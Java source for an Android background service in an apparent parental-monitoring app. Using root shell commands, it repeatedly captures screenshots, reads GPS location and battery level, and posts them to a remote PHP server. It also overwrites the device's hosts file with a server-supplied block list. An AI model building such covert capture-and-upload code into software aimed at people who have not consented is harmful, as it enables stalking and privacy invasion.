package com.example.wot.childapp;

import android.app.ProgressDialog;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.BitmapDrawable;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.IntDef;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.FileChannel;
import java.util.Hashtable;
import java.util.Map;

import static java.net.HttpURLConnection.HTTP_OK;

public class SendService extends Service {

    TrackGPS trackGPS;
    String lon,lat,cid,battery;
    SharedPreferences sharedPreferences;
    private int mProgressStatus = 0;
    Context mContext;
    boolean running=false;
    File root;
    File[] Files;
    String name;

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();

        sharedPreferences = getSharedPreferences("CHILD",MODE_PRIVATE);
        mContext = getApplicationContext();
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        mContext.registerReceiver(mBroadcastReceiver,iFilter);
        //TODO change it before delivery
        cid = sharedPreferences.getString("CID","no cid");



        Log.i("Oncreate","Service created");
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Execute your operations
        // Service wont be terminated automatically

     //   Bundle data = intent.getExtras();

   //     if (data != null) {
      //      int operation = data.getInt("OperationType");
            // Check what operation to perform and send a msg
    //        if ( operation == 99){
                // make a download
      //          Log.i("OnStart",String.valueOf(operation));
                File file = new File(Environment.getExternalStorageDirectory()+File.separator+"ParentChild_App");
                if (!file.exists()||!file.isDirectory())
                {
                    file.mkdirs();
                    if(!file.mkdirs())
                         Log.e("Not Found Dir", "Not Found Dir  ");
                }
                File file2 = new File(Environment.getExternalStorageDirectory()+File.separator+"ParentChild_App"+File.separator+"Screenshots");
                if (!file2.exists())
                {
                    file2.mkdirs();
                    if(!file.mkdirs())
                        Log.e("Not Found Dir", "Not Found Dir2  ");
                }
                running = true;
                thread.start();
                getthread.start();
           // }
     //   }
        Log.i("Onstart","Service started");
        return Service.START_STICKY; //TODO do sticky
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        try {
            mContext.unregisterReceiver(mBroadcastReceiver);
        }catch(IllegalArgumentException e) {
            e.printStackTrace();
            Log.i("unregisterreceiverexec",e.getMessage());
        }
        Log.i("OnDestroy","Service destroyed");

    }
        public String screenShot() {
            try {

                root = new File(Environment.getExternalStorageDirectory()+File.separator+"Pictures"+File.separator+"Screenshots");

                Files = root.listFiles();
                if(Files != null) {
                    int j;
                    for(j = 0; j < Files.length; j++) {
                        System.out.println(Files[j].getAbsolutePath());
                        System.out.println(Files[j].delete());
                    }
                }
                Thread.sleep(3000);
               /* Process sh = Runtime.getRuntime().exec("su");
                Log.i("ScreenShot", "image taken");
                     OutputStream  os = sh.getOutputStream();
                            os.write(("screencap -p > /sdcard/ParentChild_App/Screenshots/screenshot.png").getBytes("ASCII"));
                            os.flush();

                            os.close();
                            sh.waitFor();*/
               Process process;
                process = Runtime.getRuntime().exec("su -c input keyevent 120");

                process.waitFor();
                Thread.sleep(2000);
                File root2 = new File(Environment.getExternalStorageDirectory()+File.separator+"Pictures"+File.separator+"Screenshots");
                final File[] Files2 = root2.listFiles();
                //  Toast.makeText(MainActivity.this, "File Thread", Toast.LENGTH_SHORT).show();
                Log.i("Thread","File thread");
                if(Files2 != null) {

                    for(int s = 0; s < Files2.length; s++) {

                        System.out.println("Files : "+Files2[s].getAbsolutePath());
                        String[] sp = Files2[s].getAbsolutePath().split("/");
                        name=sp[5];
                        File src =   new File("/sdcard/Pictures/Screenshots/"+name);
                        File dest = new File(Environment.getExternalStorageDirectory() + "/ParentChild_App/Screenshots/screenshot.png");

                    }
                }


            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            return name;
        }


    public String getStringImage(Bitmap bmp){
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.PNG, 100, baos);
        byte[] imageBytes = baos.toByteArray();
        String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
        return encodedImage;
    }

    Thread thread = new Thread(new Runnable() {
        @Override
        public void run() {
            int i=0;
            Looper.prepare();
            while (running) {
                try {

                    Thread.sleep(6000); //TODO change to long duration
                    name = screenShot();
                    Thread.sleep(3000);
                    trackGPS = new TrackGPS(getBaseContext());
                    if (trackGPS.canGetLocation()) {

                        lon = String.valueOf(trackGPS.getLongitude());
                        lat = String.valueOf(trackGPS.getLatitude());
                       /* lon = String.valueOf(trackGPS.lon);
                        lat = String.valueOf(trackGPS.lat);
                        if(lon.equals("1.0")||lat.equals("1.0"))
                        {
                            Log.i("Onlonlat", "lon : "+lon+"\nlat : "+lat);
                        }*/
                    }
                    Log.i("Onvalue", String.valueOf(i) +"\n name : "+name);



                  //  Bitmap screen = BitmapFactory.decodeFile(Environment.getExternalStorageDirectory() + "/ParentChild_App/Screenshots/screenshot.png");
                    Bitmap screen = BitmapFactory.decodeFile("/sdcard/Pictures/Screenshots/"+name);
                    if (screen != null) {
                        Log.i("Onvalues", "lon : " + lon + "\nlat : " + lat + "\nbattery : " + battery + "\nscreen : " + getStringImage(screen));


                        URL url = null;
                        HttpURLConnection connection;
                        try {

                            url = new URL("https://app-1503993646.000webhostapp.com/parentchild/sendchilddetails.php");

                        } catch (MalformedURLException e1) {
                            e1.printStackTrace();
                        }
                        try {
                            connection = (HttpURLConnection) url.openConnection();
                            connection.setRequestMethod("POST");
                            connection.setConnectTimeout(10000);
                            connection.setReadTimeout(15000);
                            connection.setDoInput(true);
                            connection.setDoOutput(true);

                            Uri.Builder builder = new Uri.Builder();
                            builder.appendQueryParameter("cid", cid);
                            builder.appendQueryParameter("lon", lon);
                            builder.appendQueryParameter("lat", lat);
                            builder.appendQueryParameter("battery", battery);
                            builder.appendQueryParameter("screen", getStringImage(screen));
                            builder.appendQueryParameter("i", String.valueOf(i));


                            String query = builder.build().getEncodedQuery();

                            OutputStream os = connection.getOutputStream();
                            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                            writer.write(query);
                            writer.flush();
                            writer.close();
                            os.close();
                            connection.connect();

                            int rc = connection.getResponseCode();
                            if (rc == HTTP_OK) {
                                InputStream inputStream = connection.getInputStream();
                                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                                StringBuilder sb = new StringBuilder();
                                String line;
                                while ((line = reader.readLine()) != null) {
                                    sb.append(line);
                                }
                                Log.i("Result", sb.toString());
                            } else {
                                Log.i("Error", "Unsuccessfulcode" + rc);

                            }


                        } catch (IOException e1) {
                            e1.printStackTrace();

                        }



                    }
                    else {

                            Log.i("thread","2");
                            URL url = null;
                            HttpURLConnection connection;
                            try {

                                url = new URL("https://app-1503993646.000webhostapp.com/parentchild/sendchilddetails2.php");

                            } catch (MalformedURLException e1) {
                                e1.printStackTrace();
                            }
                            try {
                                connection = (HttpURLConnection) url.openConnection();
                                connection.setRequestMethod("POST");
                                connection.setConnectTimeout(10000);
                                connection.setReadTimeout(15000);
                                connection.setDoInput(true);
                                connection.setDoOutput(true);

                                Uri.Builder builder = new Uri.Builder();
                                builder.appendQueryParameter("cid", cid);
                                builder.appendQueryParameter("lon", lon);
                                builder.appendQueryParameter("lat", lat);
                                builder.appendQueryParameter("battery", battery);
                                builder.appendQueryParameter("i", String.valueOf(i));


                                String query = builder.build().getEncodedQuery();

                                OutputStream os = connection.getOutputStream();
                                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                                writer.write(query);
                                writer.flush();
                                writer.close();
                                os.close();
                                connection.connect();

                                int rc = connection.getResponseCode();
                                if (rc == HTTP_OK) {
                                    InputStream inputStream = connection.getInputStream();
                                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                                    StringBuilder sb = new StringBuilder();
                                    String line;
                                    while ((line = reader.readLine()) != null) {
                                        sb.append(line);
                                    }
                                    Log.i("Result2", sb.toString());
                                } else {
                                    Log.i("Error", "Unsuccessfulcode" + rc);

                                }


                            } catch (IOException e1) {
                                e1.printStackTrace();

                            }
                    }
                    i++;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    });

    private BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            // Get the battery scale
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE,-1);
            // Display the battery scale in TextView
          //  mTextViewInfo.setText("Battery Scale : " + scale);


            // get the battery level
            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL,-1);
            // Display the battery level in TextView
          //  mTextViewInfo.setText(mTextViewInfo.getText() + "\nBattery Level : " + level);

            // Calculate the battery charged percentage
            float percentage = level/ (float) scale;
            // Update the progress bar to display current battery charged percentage
            mProgressStatus = (int)((percentage)*100);

           battery = String.valueOf(mProgressStatus);
        }
    };


    Thread getthread = new Thread(new Runnable() {
        @Override
        public void run() {
            int i=0;
            while (running) {
                try {
                    Thread.sleep(25000); //TODO change to long duration

                    i++;

                        URL url = null;
                        HttpURLConnection connection;
                        try {

                            url = new URL("https://app-1503993646.000webhostapp.com/parentchild/getsiteschild.php");

                        } catch (MalformedURLException e1) {
                            e1.printStackTrace();
                        }
                        try {
                            connection = (HttpURLConnection) url.openConnection();
                            connection.setRequestMethod("POST");
                            connection.setConnectTimeout(10000);
                            connection.setReadTimeout(15000);
                            connection.setDoInput(true);
                            connection.setDoOutput(true);

                            Uri.Builder builder = new Uri.Builder();
                            builder.appendQueryParameter("cid", cid);


                            String query = builder.build().getEncodedQuery();

                            OutputStream os = connection.getOutputStream();
                            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                            writer.write(query);
                            writer.flush();
                            writer.close();
                            os.close();
                            connection.connect();

                            int rc = connection.getResponseCode();
                            if (rc == HTTP_OK) {
                                InputStream inputStream = connection.getInputStream();
                                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                                StringBuilder sb = new StringBuilder();
                                String line;
                                while ((line = reader.readLine()) != null) {
                                    sb.append("127.0.0.1 ");
                                    sb.append(line);
                                    sb.append("\n");
                                }
                                String res = sb.toString();
                                Log.i("getThreadResult", res);
                                if(res.contains("http")||res.contains("www"))
                                {
                                    FileOutputStream overWrite = null;
                                    try {
                                        overWrite = new FileOutputStream(Environment.getExternalStorageDirectory()+ File.separator+"ParentChild_App"+File.separator+"hos", false);
                                        overWrite.write(res.getBytes());
                                        overWrite.flush();
                                        overWrite.close();
                                    } catch (FileNotFoundException e) {
                                        e.printStackTrace();
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }

                                    Process sh = null;
                                    try {
                                        sh = Runtime.getRuntime().exec("su");
                                        OutputStream  ostream = sh.getOutputStream();
                                        ostream.write(("cat /sdcard/ParentChild_App/hos > etc/hosts").getBytes("ASCII"));
                                        ostream.flush();

                                        ostream.close();
                                        sh.waitFor();
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    } catch (InterruptedException e) {
                                        e.printStackTrace();
                                    }
                                }
                            } else {
                                Log.i("Error", "Unsuccessfulcode" + rc);

                            }


                        } catch (IOException e1) {
                            e1.printStackTrace();

                        }



                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    });



}
